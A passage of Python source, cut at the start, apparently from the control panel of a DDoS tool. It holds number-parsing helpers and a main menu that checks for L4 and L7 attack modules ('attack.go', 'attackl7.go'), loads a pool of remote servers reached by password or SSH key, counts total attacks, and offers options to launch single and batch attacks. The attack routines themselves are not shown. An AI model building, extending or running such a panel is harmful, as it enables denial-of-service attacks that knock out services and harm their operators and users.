        return str(n)
    if n < 1000000:
        return f"{n/1000:.1f}K"
    if n < 1000000000:
        return f"{n/1000000:.1f}M"
    return f"{n/1000000000:.1f}G"

def parse_number(s):
    s = str(s).strip().upper()
    if s.endswith('K'):
        return int(float(s[:-1]) * 1000)
    elif s.endswith('M'):
        return int(float(s[:-1]) * 1000000)
    elif s.endswith('B'):
        return int(float(s[:-1]) * 1000000000)
    elif s.endswith('T'):
        return int(float(s[:-1]) * 1000000000000)
    return int(float(s))

def main():
    if not os.path.exists('attack.go'):
        print(f"{COLOR['yellow']}⚠️  attack.go (L4) not found{COLOR['reset']}")
    if not os.path.exists('attackl7.go'):
        print(f"{COLOR['yellow']}⚠️  attackl7.go (L7) not found{COLOR['reset']}")
    time.sleep(1)
    
    data = load_servers()
    
    while True:
        clear_screen()
        print_banner()
        
        pwd = len([s for s in data['servers_password'] if s.get('active')])
        key = len([s for s in data['servers_key'] if s.get('active')])
        attacks = data['stats'].get('total_attacks', 0)
        
        print(f"{COLOR['cyan']}Status: 🔒{pwd} 🔑{key} | Attacks: {attacks}{COLOR['reset']}\n")
        
        print("1️⃣  Manage Servers")
        print("2️⃣  Launch Attack")
        print("3️⃣  Batch Attack")
        print("4️⃣  Statistics")
        print("5️⃣  Exit")
        
        choice = input(f"\n{COLOR['yellow']}Pilih menu: {COLOR['reset']}")
        
        if choice == '1':
            menu_manage_servers(data)
        elif choice == '2':
            menu_launch_attack(data)
        elif choice == '3':
            menu_batch_attack(data)
        elif choice == '4':
            menu_stats(data)
        elif choice == '5':
            print(f"{COLOR['green']}Bye!{COLOR['reset']}")
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{COLOR['yellow']}Exiting...{COLOR['reset']}")
    except Exception as e:
        print(f"\n{COLOR['red']}Fatal: {e}{COLOR['reset']}")
        import traceback
        traceback.print_exc()
